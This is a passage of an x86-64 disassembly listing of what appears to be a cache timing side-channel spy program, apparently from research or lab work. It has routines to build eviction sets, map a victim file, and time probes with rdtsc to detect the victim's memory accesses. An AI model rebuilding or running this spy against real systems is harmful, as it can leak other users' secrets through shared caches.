    1dd2:	48 8b 05 07 43 00 00 	mov    0x4307(%rip),%rax        # 60e0 <buffer_ptr>
    1dd9:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    1ddd:	48 89 d6             	mov    %rdx,%rsi
    1de0:	48 89 c7             	mov    %rax,%rdi
    1de3:	e8 3d fb ff ff       	call   1925 <list_take>
    1de8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1dec:	48 8b 05 d5 42 00 00 	mov    0x42d5(%rip),%rax        # 60c8 <evsets>
    1df3:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    1df7:	48 89 d6             	mov    %rdx,%rsi
    1dfa:	48 89 c7             	mov    %rax,%rdi
    1dfd:	e8 8f f9 ff ff       	call   1791 <list_append>
    1e02:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
    1e06:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
    1e0a:	79 9f                	jns    1dab <find_evset+0xe3>
    1e0c:	48 8d 05 72 22 00 00 	lea    0x2272(%rip),%rax        # 4085 <_IO_stdin_used+0x85>
    1e13:	48 89 c7             	mov    %rax,%rdi
    1e16:	e8 25 f2 ff ff       	call   1040 <puts@plt>
    1e1b:	48 8b 05 a6 42 00 00 	mov    0x42a6(%rip),%rax        # 60c8 <evsets>
    1e22:	48 89 c7             	mov    %rax,%rdi
    1e25:	e8 c8 fb ff ff       	call   19f2 <list_shuffle>
    1e2a:	48 8d 05 56 22 00 00 	lea    0x2256(%rip),%rax        # 4087 <_IO_stdin_used+0x87>
    1e31:	48 89 c7             	mov    %rax,%rdi
    1e34:	e8 07 f2 ff ff       	call   1040 <puts@plt>
    1e39:	48 8b 05 b0 42 00 00 	mov    0x42b0(%rip),%rax        # 60f0 <msr_index>
    1e40:	48 3d de 03 00 00    	cmp    $0x3de,%rax
    1e46:	76 0b                	jbe    1e53 <find_evset+0x18b>
    1e48:	48 c7 05 9d 42 00 00 	movq   $0x0,0x429d(%rip)        # 60f0 <msr_index>
    1e4f:	00 00 00 00 
    1e53:	48 8d 05 2f 22 00 00 	lea    0x222f(%rip),%rax        # 4089 <_IO_stdin_used+0x89>
    1e5a:	48 89 c7             	mov    %rax,%rdi
    1e5d:	e8 de f1 ff ff       	call   1040 <puts@plt>
    1e62:	48 8b 05 5f 42 00 00 	mov    0x425f(%rip),%rax        # 60c8 <evsets>
    1e69:	48 8b 00             	mov    (%rax),%rax
    1e6c:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    1e70:	48 89 d6             	mov    %rdx,%rsi
    1e73:	48 89 c7             	mov    %rax,%rdi
    1e76:	e8 31 02 00 00       	call   20ac <test>
    1e7b:	48 85 c0             	test   %rax,%rax
    1e7e:	74 2f                	je     1eaf <find_evset+0x1e7>
    1e80:	48 8b 05 41 42 00 00 	mov    0x4241(%rip),%rax        # 60c8 <evsets>
    1e87:	48 8b 00             	mov    (%rax),%rax
    1e8a:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    1e8e:	48 89 d6             	mov    %rdx,%rsi
    1e91:	48 89 c7             	mov    %rax,%rdi
    1e94:	e8 13 02 00 00       	call   20ac <test>
    1e99:	48 85 c0             	test   %rax,%rax
    1e9c:	75 30                	jne    1ece <find_evset+0x206>
    1e9e:	eb 0f                	jmp    1eaf <find_evset+0x1e7>
    1ea0:	48 8b 05 21 42 00 00 	mov    0x4221(%rip),%rax        # 60c8 <evsets>
    1ea7:	48 89 c7             	mov    %rax,%rdi
    1eaa:	e8 9f f9 ff ff       	call   184e <list_pop>
    1eaf:	48 8b 05 12 42 00 00 	mov    0x4212(%rip),%rax        # 60c8 <evsets>
    1eb6:	48 8b 00             	mov    (%rax),%rax
    1eb9:	48 85 c0             	test   %rax,%rax
    1ebc:	75 e2                	jne    1ea0 <find_evset+0x1d8>
    1ebe:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
    1ec2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
    1ec6:	0f 89 be fe ff ff    	jns    1d8a <find_evset+0xc2>
    1ecc:	eb 01                	jmp    1ecf <find_evset+0x207>
    1ece:	90                   	nop
    1ecf:	48 8d 05 99 21 00 00 	lea    0x2199(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    1ed6:	48 89 c7             	mov    %rax,%rdi
    1ed9:	e8 62 f1 ff ff       	call   1040 <puts@plt>
    1ede:	48 8b 05 e3 41 00 00 	mov    0x41e3(%rip),%rax        # 60c8 <evsets>
    1ee5:	c9                   	leave
    1ee6:	c3                   	ret

0000000000001ee7 <del_evset>:
    1ee7:	55                   	push   %rbp
    1ee8:	48 89 e5             	mov    %rsp,%rbp
    1eeb:	48 8b 05 d6 41 00 00 	mov    0x41d6(%rip),%rax        # 60c8 <evsets>
    1ef2:	48 85 c0             	test   %rax,%rax
    1ef5:	74 22                	je     1f19 <del_evset+0x32>
    1ef7:	eb 0f                	jmp    1f08 <del_evset+0x21>
    1ef9:	48 8b 05 c8 41 00 00 	mov    0x41c8(%rip),%rax        # 60c8 <evsets>
    1f00:	48 89 c7             	mov    %rax,%rdi
    1f03:	e8 46 f9 ff ff       	call   184e <list_pop>
    1f08:	48 8b 05 b9 41 00 00 	mov    0x41b9(%rip),%rax        # 60c8 <evsets>
    1f0f:	48 8b 00             	mov    (%rax),%rax
    1f12:	48 85 c0             	test   %rax,%rax
    1f15:	75 e2                	jne    1ef9 <del_evset+0x12>
    1f17:	eb 01                	jmp    1f1a <del_evset+0x33>
    1f19:	90                   	nop
    1f1a:	5d                   	pop    %rbp
    1f1b:	c3                   	ret

0000000000001f1c <get_evset>:
    1f1c:	55                   	push   %rbp
    1f1d:	48 89 e5             	mov    %rsp,%rbp
    1f20:	48 8b 05 a1 41 00 00 	mov    0x41a1(%rip),%rax        # 60c8 <evsets>
    1f27:	48 85 c0             	test   %rax,%rax
    1f2a:	75 07                	jne    1f33 <get_evset+0x17>
    1f2c:	b8 00 00 00 00       	mov    $0x0,%eax
    1f31:	eb 07                	jmp    1f3a <get_evset+0x1e>
    1f33:	48 8b 05 8e 41 00 00 	mov    0x418e(%rip),%rax        # 60c8 <evsets>
    1f3a:	5d                   	pop    %rbp
    1f3b:	c3                   	ret

0000000000001f3c <close_evsets>:
    1f3c:	55                   	push   %rbp
    1f3d:	48 89 e5             	mov    %rsp,%rbp
    1f40:	48 8b 05 81 41 00 00 	mov    0x4181(%rip),%rax        # 60c8 <evsets>
    1f47:	48 85 c0             	test   %rax,%rax
    1f4a:	74 1a                	je     1f66 <close_evsets+0x2a>
    1f4c:	48 8b 05 75 41 00 00 	mov    0x4175(%rip),%rax        # 60c8 <evsets>
    1f53:	48 89 c7             	mov    %rax,%rdi
    1f56:	e8 d5 f0 ff ff       	call   1030 <free@plt>
    1f5b:	48 c7 05 62 41 00 00 	movq   $0x0,0x4162(%rip)        # 60c8 <evsets>
    1f62:	00 00 00 00 
    1f66:	48 8b 05 63 41 00 00 	mov    0x4163(%rip),%rax        # 60d0 <buffer>
    1f6d:	48 85 c0             	test   %rax,%rax
    1f70:	74 19                	je     1f8b <close_evsets+0x4f>
    1f72:	48 8b 15 5f 41 00 00 	mov    0x415f(%rip),%rdx        # 60d8 <buffer_size>
    1f79:	48 8b 05 50 41 00 00 	mov    0x4150(%rip),%rax        # 60d0 <buffer>
    1f80:	48 89 d6             	mov    %rdx,%rsi
    1f83:	48 89 c7             	mov    %rax,%rdi
    1f86:	e8 75 f1 ff ff       	call   1100 <munmap@plt>
    1f8b:	48 8b 05 2e 41 00 00 	mov    0x412e(%rip),%rax        # 60c0 <conf>
    1f92:	48 85 c0             	test   %rax,%rax
    1f95:	74 1a                	je     1fb1 <close_evsets+0x75>
    1f97:	48 8b 05 22 41 00 00 	mov    0x4122(%rip),%rax        # 60c0 <conf>
    1f9e:	48 89 c7             	mov    %rax,%rdi
    1fa1:	e8 8a f0 ff ff       	call   1030 <free@plt>
    1fa6:	48 c7 05 0f 41 00 00 	movq   $0x0,0x410f(%rip)        # 60c0 <conf>
    1fad:	00 00 00 00 
    1fb1:	90                   	nop
    1fb2:	5d                   	pop    %rbp
    1fb3:	c3                   	ret

0000000000001fb4 <traverse_list0>:
    1fb4:	55                   	push   %rbp
    1fb5:	48 89 e5             	mov    %rsp,%rbp
    1fb8:	48 83 ec 18          	sub    $0x18,%rsp
    1fbc:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1fc0:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    1fc7:	00 
    1fc8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1fcc:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1fd0:	eb 1a                	jmp    1fec <traverse_list0+0x38>
    1fd2:	0f ae e8             	lfence
    1fd5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1fd9:	48 89 c7             	mov    %rax,%rdi
    1fdc:	e8 6c f3 ff ff       	call   134d <my_access>
    1fe1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1fe5:	48 8b 00             	mov    (%rax),%rax
    1fe8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1fec:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1ff0:	48 8d 50 01          	lea    0x1(%rax),%rdx
    1ff4:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
    1ff8:	48 8b 15 c1 40 00 00 	mov    0x40c1(%rip),%rdx        # 60c0 <conf>
    1fff:	48 8b 12             	mov    (%rdx),%rdx
    2002:	48 39 d0             	cmp    %rdx,%rax
    2005:	72 cb                	jb     1fd2 <traverse_list0+0x1e>
    2007:	90                   	nop
    2008:	90                   	nop
    2009:	c9                   	leave
    200a:	c3                   	ret

000000000000200b <test_intern>:
    200b:	55                   	push   %rbp
    200c:	48 89 e5             	mov    %rsp,%rbp
    200f:	53                   	push   %rbx
    2010:	48 83 ec 18          	sub    $0x18,%rsp
    2014:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2018:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    201c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2020:	48 89 c7             	mov    %rax,%rdi
    2023:	e8 25 f3 ff ff       	call   134d <my_access>
    2028:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    202c:	48 89 c7             	mov    %rax,%rdi
    202f:	e8 80 ff ff ff       	call   1fb4 <traverse_list0>
    2034:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2038:	48 05 de 00 00 00    	add    $0xde,%rax
    203e:	48 89 c7             	mov    %rax,%rdi
    2041:	e8 07 f3 ff ff       	call   134d <my_access>
    2046:	48 8b 0d ab 40 00 00 	mov    0x40ab(%rip),%rcx        # 60f8 <msrmts>
    204d:	48 8b 05 9c 40 00 00 	mov    0x409c(%rip),%rax        # 60f0 <msr_index>
    2054:	48 8d 50 01          	lea    0x1(%rax),%rdx
    2058:	48 89 15 91 40 00 00 	mov    %rdx,0x4091(%rip)        # 60f0 <msr_index>
    205f:	48 c1 e0 03          	shl    $0x3,%rax
    2063:	48 8d 1c 01          	lea    (%rcx,%rax,1),%rbx
    2067:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    206b:	be 01 00 00 00       	mov    $0x1,%esi
    2070:	48 89 c7             	mov    %rax,%rdi
    2073:	e8 f9 f2 ff ff       	call   1371 <probe_chase_loop>
    2078:	48 89 03             	mov    %rax,(%rbx)
    207b:	48 8d 05 09 20 00 00 	lea    0x2009(%rip),%rax        # 408b <_IO_stdin_used+0x8b>
    2082:	48 89 c7             	mov    %rax,%rdi
    2085:	e8 b6 ef ff ff       	call   1040 <puts@plt>
    208a:	48 8b 05 67 40 00 00 	mov    0x4067(%rip),%rax        # 60f8 <msrmts>
    2091:	48 8b 15 58 40 00 00 	mov    0x4058(%rip),%rdx        # 60f0 <msr_index>
    2098:	48 c1 e2 03          	shl    $0x3,%rdx
    209c:	48 83 ea 08          	sub    $0x8,%rdx
    20a0:	48 01 d0             	add    %rdx,%rax
    20a3:	48 8b 00             	mov    (%rax),%rax
    20a6:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    20aa:	c9                   	leave
    20ab:	c3                   	ret

00000000000020ac <test>:
    20ac:	55                   	push   %rbp
    20ad:	48 89 e5             	mov    %rsp,%rbp
    20b0:	48 83 ec 10          	sub    $0x10,%rsp
    20b4:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    20b8:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    20bc:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    20c1:	74 07                	je     20ca <test+0x1e>
    20c3:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    20c8:	75 07                	jne    20d1 <test+0x25>
    20ca:	b8 00 00 00 00       	mov    $0x0,%eax
    20cf:	eb 36                	jmp    2107 <test+0x5b>
    20d1:	48 8d 05 ba 1f 00 00 	lea    0x1fba(%rip),%rax        # 4092 <_IO_stdin_used+0x92>
    20d8:	48 89 c7             	mov    %rax,%rdi
    20db:	e8 60 ef ff ff       	call   1040 <puts@plt>
    20e0:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    20e4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20e8:	48 89 d6             	mov    %rdx,%rsi
    20eb:	48 89 c7             	mov    %rax,%rdi
    20ee:	e8 18 ff ff ff       	call   200b <test_intern>
    20f3:	48 8b 15 c6 3f 00 00 	mov    0x3fc6(%rip),%rdx        # 60c0 <conf>
    20fa:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    20fe:	48 39 c2             	cmp    %rax,%rdx
    2101:	0f 92 c0             	setb   %al
    2104:	0f b6 c0             	movzbl %al,%eax
    2107:	c9                   	leave
    2108:	c3                   	ret

0000000000002109 <target_loader>:
    2109:	55                   	push   %rbp
    210a:	48 89 e5             	mov    %rsp,%rbp
    210d:	48 83 ec 40          	sub    $0x40,%rsp
    2111:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    2115:	48 8d 05 53 1f 00 00 	lea    0x1f53(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    211c:	48 89 c7             	mov    %rax,%rdi
    211f:	e8 1c ef ff ff       	call   1040 <puts@plt>
    2124:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2128:	48 8d 15 68 1f 00 00 	lea    0x1f68(%rip),%rdx        # 4097 <_IO_stdin_used+0x97>
    212f:	48 89 d6             	mov    %rdx,%rsi
    2132:	48 89 c7             	mov    %rax,%rdi
    2135:	e8 e6 ef ff ff       	call   1120 <fopen@plt>
    213a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    213e:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
    2145:	00 
    2146:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
    214d:	00 
    214e:	48 8d 05 1a 1f 00 00 	lea    0x1f1a(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2155:	48 89 c7             	mov    %rax,%rdi
    2158:	e8 e3 ee ff ff       	call   1040 <puts@plt>
    215d:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    2162:	75 19                	jne    217d <target_loader+0x74>
    2164:	48 8d 05 35 1f 00 00 	lea    0x1f35(%rip),%rax        # 40a0 <_IO_stdin_used+0xa0>
    216b:	48 89 c7             	mov    %rax,%rdi
    216e:	e8 bd ef ff ff       	call   1130 <perror@plt>
    2173:	bf 01 00 00 00       	mov    $0x1,%edi
    2178:	e8 d3 ef ff ff       	call   1150 <exit@plt>
    217d:	48 8d 05 eb 1e 00 00 	lea    0x1eeb(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2184:	48 89 c7             	mov    %rax,%rdi
    2187:	e8 b4 ee ff ff       	call   1040 <puts@plt>
    218c:	eb 5d                	jmp    21eb <target_loader+0xe2>
    218e:	48 8d 05 da 1e 00 00 	lea    0x1eda(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2195:	48 89 c7             	mov    %rax,%rdi
    2198:	e8 a3 ee ff ff       	call   1040 <puts@plt>
    219d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    21a1:	48 89 c7             	mov    %rax,%rdi
    21a4:	e8 c7 ee ff ff       	call   1070 <strlen@plt>
    21a9:	48 c1 e0 03          	shl    $0x3,%rax
    21ad:	48 8d 50 f8          	lea    -0x8(%rax),%rdx
    21b1:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    21b5:	48 01 d0             	add    %rdx,%rax
    21b8:	48 8d 15 05 1f 00 00 	lea    0x1f05(%rip),%rdx        # 40c4 <_IO_stdin_used+0xc4>
    21bf:	48 89 10             	mov    %rdx,(%rax)
    21c2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    21c6:	ba 10 00 00 00       	mov    $0x10,%edx
    21cb:	be 00 00 00 00       	mov    $0x0,%esi
    21d0:	48 89 c7             	mov    %rax,%rdi
    21d3:	e8 d8 ee ff ff       	call   10b0 <strtol@plt>
    21d8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    21dc:	48 8d 05 8c 1e 00 00 	lea    0x1e8c(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    21e3:	48 89 c7             	mov    %rax,%rdi
    21e6:	e8 55 ee ff ff       	call   1040 <puts@plt>
    21eb:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    21ef:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
    21f3:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    21f7:	48 89 ce             	mov    %rcx,%rsi
    21fa:	48 89 c7             	mov    %rax,%rdi
    21fd:	e8 3e ef ff ff       	call   1140 <getline@plt>
    2202:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    2206:	48 83 7d e8 ff       	cmpq   $0xffffffffffffffff,-0x18(%rbp)
    220b:	75 81                	jne    218e <target_loader+0x85>
    220d:	48 8d 05 5b 1e 00 00 	lea    0x1e5b(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    2214:	48 89 c7             	mov    %rax,%rdi
    2217:	e8 24 ee ff ff       	call   1040 <puts@plt>
    221c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2220:	48 89 c7             	mov    %rax,%rdi
    2223:	e8 38 ee ff ff       	call   1060 <fclose@plt>
    2228:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    222c:	48 89 c7             	mov    %rax,%rdi
    222f:	e8 fc ed ff ff       	call   1030 <free@plt>
    2234:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2238:	c9                   	leave
    2239:	c3                   	ret

000000000000223a <victim_reader>:
    223a:	55                   	push   %rbp
    223b:	48 89 e5             	mov    %rsp,%rbp
    223e:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
    2245:	48 89 bd 58 ff ff ff 	mov    %rdi,-0xa8(%rbp)
    224c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
    2253:	48 8d 15 3d 1e 00 00 	lea    0x1e3d(%rip),%rdx        # 4097 <_IO_stdin_used+0x97>
    225a:	48 89 d6             	mov    %rdx,%rsi
    225d:	48 89 c7             	mov    %rax,%rdi
    2260:	e8 bb ee ff ff       	call   1120 <fopen@plt>
    2265:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2269:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    226d:	48 89 c7             	mov    %rax,%rdi
    2270:	e8 5b ee ff ff       	call   10d0 <fileno@plt>
    2275:	89 45 f4             	mov    %eax,-0xc(%rbp)
    2278:	48 8d 95 60 ff ff ff 	lea    -0xa0(%rbp),%rdx
    227f:	8b 45 f4             	mov    -0xc(%rbp),%eax
    2282:	48 89 d6             	mov    %rdx,%rsi
    2285:	89 c7                	mov    %eax,%edi
    2287:	e8 d4 ee ff ff       	call   1160 <fstat@plt>
    228c:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    2290:	89 05 82 3e 00 00    	mov    %eax,0x3e82(%rip)        # 6118 <map_len>
    2296:	8b 05 7c 3e 00 00    	mov    0x3e7c(%rip),%eax        # 6118 <map_len>
    229c:	48 98                	cltq
    229e:	8b 55 f4             	mov    -0xc(%rbp),%edx
    22a1:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    22a7:	41 89 d0             	mov    %edx,%r8d
    22aa:	b9 01 00 00 00       	mov    $0x1,%ecx
    22af:	ba 01 00 00 00       	mov    $0x1,%edx
    22b4:	48 89 c6             	mov    %rax,%rsi
    22b7:	bf 00 00 00 00       	mov    $0x0,%edi
    22bc:	e8 bf ed ff ff       	call   1080 <mmap@plt>
    22c1:	48 89 05 48 3e 00 00 	mov    %rax,0x3e48(%rip)        # 6110 <victim>
    22c8:	48 8b 05 41 3e 00 00 	mov    0x3e41(%rip),%rax        # 6110 <victim>
    22cf:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    22d3:	75 19                	jne    22ee <victim_reader+0xb4>
    22d5:	48 8d 05 ea 1d 00 00 	lea    0x1dea(%rip),%rax        # 40c6 <_IO_stdin_used+0xc6>
    22dc:	48 89 c7             	mov    %rax,%rdi
    22df:	e8 4c ee ff ff       	call   1130 <perror@plt>
    22e4:	bf 01 00 00 00       	mov    $0x1,%edi
    22e9:	e8 62 ee ff ff       	call   1150 <exit@plt>
    22ee:	90                   	nop
    22ef:	c9                   	leave
    22f0:	c3                   	ret

00000000000022f1 <init_spy>:
    22f1:	55                   	push   %rbp
    22f2:	48 89 e5             	mov    %rsp,%rbp
    22f5:	48 83 ec 20          	sub    $0x20,%rsp
    22f9:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    22fd:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2301:	48 8d 05 d2 1d 00 00 	lea    0x1dd2(%rip),%rax        # 40da <_IO_stdin_used+0xda>
    2308:	48 89 c7             	mov    %rax,%rdi
    230b:	e8 30 ed ff ff       	call   1040 <puts@plt>
    2310:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2314:	48 89 c7             	mov    %rax,%rdi
    2317:	e8 1e ff ff ff       	call   223a <victim_reader>
    231c:	48 8d 05 c0 1d 00 00 	lea    0x1dc0(%rip),%rax        # 40e3 <_IO_stdin_used+0xe3>
    2323:	48 89 c7             	mov    %rax,%rdi
    2326:	e8 15 ed ff ff       	call   1040 <puts@plt>
    232b:	48 83 ec 08          	sub    $0x8,%rsp
    232f:	6a 01                	push   $0x1
    2331:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    2337:	41 b8 00 00 20 00    	mov    $0x200000,%r8d
    233d:	b9 69 00 00 00       	mov    $0x69,%ecx
    2342:	ba 40 00 00 00       	mov    $0x40,%edx
    2347:	be 00 08 00 00       	mov    $0x800,%esi
    234c:	bf 18 00 00 00       	mov    $0x18,%edi
    2351:	e8 91 f1 ff ff       	call   14e7 <config_init>
    2356:	48 83 c4 10          	add    $0x10,%rsp
    235a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    235e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2362:	48 89 c7             	mov    %rax,%rdi
    2365:	e8 48 f8 ff ff       	call   1bb2 <init_evset>
    236a:	48 8d 05 7e 1d 00 00 	lea    0x1d7e(%rip),%rax        # 40ef <_IO_stdin_used+0xef>
    2371:	48 89 c7             	mov    %rax,%rdi
    2374:	e8 c7 ec ff ff       	call   1040 <puts@plt>
    2379:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    237d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2381:	48 89 d6             	mov    %rdx,%rsi
    2384:	48 89 c7             	mov    %rax,%rdi
    2387:	e8 3c f9 ff ff       	call   1cc8 <find_evset>
    238c:	48 89 05 75 3d 00 00 	mov    %rax,0x3d75(%rip)        # 6108 <spy_evsets>
    2393:	48 8d 05 65 1d 00 00 	lea    0x1d65(%rip),%rax        # 40ff <_IO_stdin_used+0xff>
    239a:	48 89 c7             	mov    %rax,%rdi
    239d:	e8 9e ec ff ff       	call   1040 <puts@plt>
    23a2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    23a6:	48 89 c6             	mov    %rax,%rsi
    23a9:	48 8d 05 60 1d 00 00 	lea    0x1d60(%rip),%rax        # 4110 <_IO_stdin_used+0x110>
    23b0:	48 89 c7             	mov    %rax,%rdi
    23b3:	b8 00 00 00 00       	mov    $0x0,%eax
    23b8:	e8 d3 ec ff ff       	call   1090 <printf@plt>
    23bd:	48 8d 05 53 f7 ff ff 	lea    -0x8ad(%rip),%rax        # 1b17 <list_print>
    23c4:	48 89 c7             	mov    %rax,%rdi
    23c7:	e8 4b f7 ff ff       	call   1b17 <list_print>
    23cc:	90                   	nop
    23cd:	c9                   	leave
    23ce:	c3                   	ret

00000000000023cf <my_detect>:
    23cf:	55                   	push   %rbp
    23d0:	48 89 e5             	mov    %rsp,%rbp
    23d3:	48 83 ec 08          	sub    $0x8,%rsp
    23d7:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    23db:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    23df:	48 89 c7             	mov    %rax,%rdi
    23e2:	e8 66 ef ff ff       	call   134d <my_access>
    23e7:	48 8d 05 29 f7 ff ff 	lea    -0x8d7(%rip),%rax        # 1b17 <list_print>
    23ee:	48 89 c7             	mov    %rax,%rdi
    23f1:	e8 be fb ff ff       	call   1fb4 <traverse_list0>
    23f6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    23fa:	48 05 de 00 00 00    	add    $0xde,%rax
    2400:	48 89 c7             	mov    %rax,%rdi
    2403:	e8 45 ef ff ff       	call   134d <my_access>
    2408:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    240c:	be 01 00 00 00       	mov    $0x1,%esi
    2411:	48 89 c7             	mov    %rax,%rdi
    2414:	e8 58 ef ff ff       	call   1371 <probe_chase_loop>
    2419:	c9                   	leave
    241a:	c3                   	ret

000000000000241b <rdtsc>:
    241b:	55                   	push   %rbp
    241c:	48 89 e5             	mov    %rsp,%rbp
    241f:	0f 31                	rdtsc
    2421:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2425:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2429:	5d                   	pop    %rbp
    242a:	c3                   	ret

000000000000242b <my_monitor>:
    242b:	55                   	push   %rbp
    242c:	48 89 e5             	mov    %rsp,%rbp
    242f:	48 83 ec 30          	sub    $0x30,%rsp
    2433:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    2437:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    243e:	00 
    243f:	e8 d7 ff ff ff       	call   241b <rdtsc>
    2444:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2448:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    244c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    2450:	e8 c6 ff ff ff       	call   241b <rdtsc>
    2455:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2459:	eb 09                	jmp    2464 <my_monitor+0x39>
    245b:	e8 bb ff ff ff       	call   241b <rdtsc>
    2460:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2464:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2468:	48 2b 45 e8          	sub    -0x18(%rbp),%rax
    246c:	48 3d c3 09 00 00    	cmp    $0x9c3,%rax
    2472:	76 e7                	jbe    245b <my_monitor+0x30>
    2474:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2478:	48 89 c7             	mov    %rax,%rdi
    247b:	e8 4f ff ff ff       	call   23cf <my_detect>
    2480:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2484:	48 8b 05 35 3c 00 00 	mov    0x3c35(%rip),%rax        # 60c0 <conf>
    248b:	48 8b 40 18          	mov    0x18(%rax),%rax
    248f:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    2493:	72 02                	jb     2497 <my_monitor+0x6c>
    2495:	eb b1                	jmp    2448 <my_monitor+0x1d>
    2497:	90                   	nop
    2498:	48 8d 05 99 1c 00 00 	lea    0x1c99(%rip),%rax        # 4138 <_IO_stdin_used+0x138>
    249f:	48 89 c7             	mov    %rax,%rdi
    24a2:	e8 99 eb ff ff       	call   1040 <puts@plt>
    24a7:	90                   	nop
    24a8:	c9                   	leave
    24a9:	c3                   	ret

00000000000024aa <spy>:
    24aa:	55                   	push   %rbp
    24ab:	48 89 e5             	mov    %rsp,%rbp
    24ae:	48 83 ec 10          	sub    $0x10,%rsp
    24b2:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    24b6:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    24ba:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    24be:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    24c2:	48 89 d6             	mov    %rdx,%rsi
    24c5:	48 89 c7             	mov    %rax,%rdi
    24c8:	e8 24 fe ff ff       	call   22f1 <init_spy>
    24cd:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    24d1:	48 89 c6             	mov    %rax,%rsi
    24d4:	48 8d 05 7d 1c 00 00 	lea    0x1c7d(%rip),%rax        # 4158 <_IO_stdin_used+0x158>
    24db:	48 89 c7             	mov    %rax,%rdi
    24de:	b8 00 00 00 00       	mov    $0x0,%eax
    24e3:	e8 a8 eb ff ff       	call   1090 <printf@plt>
    24e8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    24ec:	48 89 c7             	mov    %rax,%rdi
    24ef:	e8 37 ff ff ff       	call   242b <my_monitor>
    24f4:	90                   	nop
    24f5:	c9                   	leave
    24f6:	c3                   	ret

00000000000024f7 <main>:
    24f7:	55                   	push   %rbp
    24f8:	48 89 e5             	mov    %rsp,%rbp
